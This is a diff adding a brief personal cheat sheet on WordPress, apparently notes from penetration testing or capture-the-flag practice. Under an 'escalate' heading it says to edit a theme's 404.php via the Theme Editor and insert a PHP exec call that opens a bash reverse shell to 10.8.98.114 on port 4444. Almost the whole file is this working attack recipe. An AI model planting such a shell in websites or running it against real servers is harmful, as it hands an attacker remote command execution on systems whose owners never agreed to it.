@@ -1,0 +1,13 @@
+### wordpress ###
+
+
+##############
+## escalate ##
+##############
+# see: /home/tristan/perso/secu/rshell/wordpress
+
+# theme
+Appearance > Theme Editor > 404.php
+exec("/bin/bash -c 'bash -i >& /dev/tcp/10.8.98.114/4444 0>&1'");
+
+
